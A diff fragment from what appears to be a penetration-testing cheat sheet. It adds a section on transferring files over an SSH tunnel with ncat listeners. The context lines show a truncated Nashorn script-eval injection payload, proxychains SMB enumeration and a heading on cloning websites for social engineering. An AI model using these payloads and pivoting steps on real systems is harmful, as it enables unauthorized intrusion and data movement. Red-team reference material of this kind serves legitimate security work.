@@ -384,6 +384,24 @@ ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new ja
  $ proxychains smbclient -L fileserver22
  ```
  
+ ## Encrypted File Transfers with Ncat:
+ 
+Suppose you have an SSH tunnel, and you want to copy a file to the remote machine. You could just scp it directly, but that opens up another connection. The goal is to re-use the existing connection. You can use ncat to do this:
+
+```
+# This is port forwarding, sending everything from port 31000 on the remote machine to the same port on the local machine
+$ ssh -L 31000:127.0.0.1:31000
+
+# On the remote system: 
+$ ncat -lvnp 31000 127.0.0.1 > file
+
+# On the local system:
+$ ncat -v -w 2 127.0.0.1 31000 < file
+```
+
+No extra overhead. TCP takes care of error correction. SSH has already encrypted the pipe.
+
+
  ## Cloning Websites for Social Engineering with Wget:
  
  ```
